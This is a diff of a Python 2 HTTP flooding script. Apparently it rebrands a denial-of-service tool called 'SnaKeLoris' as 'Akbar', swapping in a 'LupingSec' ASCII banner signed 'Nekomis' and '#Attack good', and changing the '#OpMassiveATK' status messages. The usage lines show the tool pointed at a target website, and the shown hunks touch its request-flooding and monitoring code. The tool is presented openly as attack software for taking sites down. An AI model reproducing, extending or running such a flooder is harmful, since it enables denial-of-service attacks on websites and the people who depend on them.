@@ -269,24 +269,26 @@ def buildblock(size):
 def usage():
 	print '---------------------------------------------------'
 	print 'to attack:'
-        print '#Windows: SnaKeLoris.py http://www.exemplo.com/'
-        print '#Linux: python SnaKeLoris.py http://www.exemplo.com/'
+        print '#Windows: Akbar.py http://www.exemplo.com.br/'
+        print '#Linux: python Akbar.py http://www.exemplo.com.br/'
 	print "\a"
 print \
-"""                                                                                                                                          
-              f---\-/---Y                     
-          |f /l    Y    j\\,|
-          l (  \-"-^-"-/  ) j
-           `.`. Y`-^-'f .','
-             l_)|`-^-'|(_j   _____
-              ,'` -^- '`.,-'",  < "`-.
-             f`--------'|> <  > , > ' `-.      _.,-----.
-             l`--------'l < ' ,--.  < >  `---"',  '_,--.`-.._,
-              \`--------'`-.,'    `.  , '< > ,  ,'"     "`--'
-               `._______.-'"        `-._____.,-'                                                                     
-                                                [+] SnaKeLoris [+]
-                                                Script By EyuB@@ and Centr@s7 
-                                                 
+"""                          
+  
+                                                                          
+                                                                          
+   ###########################################################################        
+   #                  __      ||  // _______        __     ______            # 
+   #                /'__`\    || //  \'\   _)     /'__`\   \\   \\              #
+   #               /\ \_\ \_  ||-/    \'\--\_-   /\ \_\ \_  \\___\\_            #
+   #               \ \___ \_\ ||\\     \'\   \\    \ \___ \_\  \\    \\           # 
+   #                \/__/\/_/ || \\     \'\___\\    \/__/\/_/   \\    \\          #
+   #                                                                         #
+   #                                                                         #  
+   #                                                      [+] LupingSec [+]  # 
+   #                                                      Script By Nekomis  #
+   #                                                           #Attack good  #
+   ###########################################################################...
 """
 print '---------------------------------------------------'
 
@@ -313,7 +315,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print 'Bots Is Connect packets upload'
+ 			print 'Bots Is Connect 20k de packets upload'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -344,7 +346,7 @@ class MonitorThread(threading.Thread):
 				print "%d Shots sends Senting" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n -SnakeLoris Hits are secced"
+			print "\n -AKBAR Hits are secced"
 
 #execute 
 if len(sys.argv) < 2:
@@ -355,7 +357,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "#OpMassiveATK SnaKeLoris"
+		print "#OpMassiveATK Akbar"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
